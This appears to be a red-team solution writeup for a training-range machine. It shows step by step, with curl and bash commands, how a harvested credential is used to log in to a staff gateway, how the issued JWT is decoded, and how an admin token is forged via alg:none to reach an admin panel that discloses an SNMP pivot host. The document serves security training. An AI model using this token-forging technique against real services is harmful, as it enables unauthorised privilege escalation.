# solve_red.md — M3 · itgw-sso
## Red Team Solution Writeup
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M3 — Staff Authentication Gateway
**Vulnerability:** JWT Algorithm Confusion (alg: none)
**MITRE ATT&CK:** T1606 (Forge Web Credentials) · T1078 (Valid Accounts)
**Severity:** Critical
**Kill Chain Stage:** Exploitation → Privilege Escalation

---

## Objective
Login to the Staff Authentication Gateway using the `svc-deploy-sso` credential obtained from M2. Analyse the issued JWT. Exploit JWT algorithm confusion to forge an admin-role token and access the admin infrastructure panel revealing the SNMP management host for M4.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x` |
| Service Port | `8443` |
| Credential (from M2) | `svc-deploy-sso : SSO@Prabal!2024` |

---

## Step-by-Step Exploitation

### Step 1 — Login with Harvested Credential

```bash
curl -s -c /tmp/sso_cookies.txt -X POST http://203.x.x.x:8443/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=svc-deploy-sso&password=SSO%40Prabal%212024" -L
```

On success, a `pul_staff_token` cookie is set containing a JWT. The portal displays the raw token split into its three Base64URL-encoded sections (header · payload · signature).

### Step 2 — Decode the JWT

Extract the token from the cookie jar:
```bash
TOKEN=$(grep "pul_staff_token" /tmp/sso_cookies.txt | awk '{print $7}')
echo $TOKEN
```

Decode the header and payload (Base64URL — add padding as needed):
```bash
# Header (part 1)
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null || \
  echo $TOKEN | cut -d'.' -f1 | awk '{n=length($0)%4; if(n==2)printf "%s==", $0; else if(n==3)printf "%s=", $0; else print $0}' | base64 -d

# Payload (part 2)
echo $TOKEN | cut -d'.' -f2 | awk '{n=length($0)%4; if(n==2)printf "%s==", $0; else if(n==3)printf "%s=", $0; else print $0}' | base64 -d
```

**Decoded header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Decoded payload:**
```json
{"sub": "svc-deploy-sso", "role": "analyst", "iat": 1731234567, "exp": 1731238167}
```

### Step 3 — Forge Admin JWT with alg: none

The vulnerability: the server's `decode_jwt_vulnerable()` function checks the `alg` field from the header and, if it is `"none"`, skips signature verification entirely. We can forge a token with any payload.

**Build the forged token:**
```bash
# New header — alg: none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')

# New payload — role changed to admin
PAYLOAD=$(echo -n '{"sub":"svc-deploy-sso","role":"admin","iat":1731234567,"exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')

# alg: none token has empty signature
FORGED_TOKEN="${HEADER}.${PAYLOAD}."

echo "Forged JWT: ${FORGED_TOKEN}"
```

### Step 4 — Submit Forged Token

```bash
curl -s -b "pul_staff_token=${FORGED_TOKEN}" \
  http://203.x.x.x:8443/staff-portal
```

The server accepts the token (alg: none → no signature check), decodes the payload, reads `role: admin`, and renders the admin infrastructure panel.

### Step 5 — Extract M4 Pivot Artifact

The admin panel discloses:

| Field | Value |
|---|---|
| SNMP Host | `203.x.x.x` |
| SNMP Port | `161` |
| SNMP Version | `v2c` |
| Description | Network Management Host — SNMP polling agent |

This is the pivot artifact for **M4 — itgw-netmgmt**.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Forge Web Credentials | T1606 |
| Privilege Escalation | Valid Accounts | T1078 |
| Discovery | System Information Discovery | T1082 |
